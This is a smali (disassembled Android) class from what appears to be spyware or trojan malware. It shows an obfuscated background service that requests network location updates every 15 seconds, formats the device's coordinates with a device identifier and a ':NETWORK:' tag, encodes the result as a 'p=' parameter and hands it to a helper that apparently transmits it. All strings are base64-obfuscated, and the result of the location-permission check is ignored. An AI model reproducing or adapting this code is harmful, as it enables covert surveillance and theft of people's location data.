.class public Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;
.super Landroid/app/Service;
.source ""


# instance fields
.field public fddo:Landroid/location/LocationManager;

.field for:Lnaqsl/ebxcb/exu/int;

.field ifdf:Lnaqsl/ebxcb/exu/int;

.field private int:Landroid/location/LocationListener;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/ifdf;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/ifdf;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->for:Lnaqsl/ebxcb/exu/int;

    new-instance v0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork$fddo;

    invoke-direct {v0, p0}, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork$fddo;-><init>(Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;)V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->int:Landroid/location/LocationListener;

    return-void
.end method

.method private fddo(Landroid/location/Location;)Ljava/lang/String;
    .registers 7

    if-nez p1, :cond_5

    const-string p1, ""

    return-object p1

    :cond_5
    const-string v0, "JTEkLjRmOiUyJC40Zg=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v3

    aput-object v3, v1, v2

    const/4 v2, 0x1

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-static {v3, v4}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object p1

    aput-object p1, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    const-string v0, "LA=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "Lg=="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method static synthetic fddo(Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;Landroid/location/Location;)V
    .registers 2

    invoke-direct {p0, p1}, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->ifdf(Landroid/location/Location;)V

    return-void
.end method

.method private ifdf(Landroid/location/Location;)V
    .registers 8

    if-nez p1, :cond_3

    return-void

    :cond_3
    invoke-virtual {p1}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v0

    const-string v1, "network"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_60

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "NQ=="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "cD0="

    invoke-static {v3}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->ifdf:Lnaqsl/ebxcb/exu/int;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, p0}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "Og=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-direct {p0, p1}, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->fddo(Landroid/location/Location;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "Ok5FVFdPUks6"

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p0, v1, p1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_60
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2

    const/4 p1, 0x0

    return-object p1
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 10

    :try_start_0
    const-string p1, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, p1}, Landroid/app/Service;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    const-string p1, "location"

    invoke-virtual {p0, p1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/location/LocationManager;

    iput-object p1, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->fddo:Landroid/location/LocationManager;

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->fddo:Landroid/location/LocationManager;

    const-string v1, "network"

    const-wide/16 v2, 0x3a98

    const/high16 v4, 0x41200000    # 10.0f

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceGeolocationNetwork;->int:Landroid/location/LocationListener;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_1c} :catch_1c

    :catch_1c
    return p2
.end method
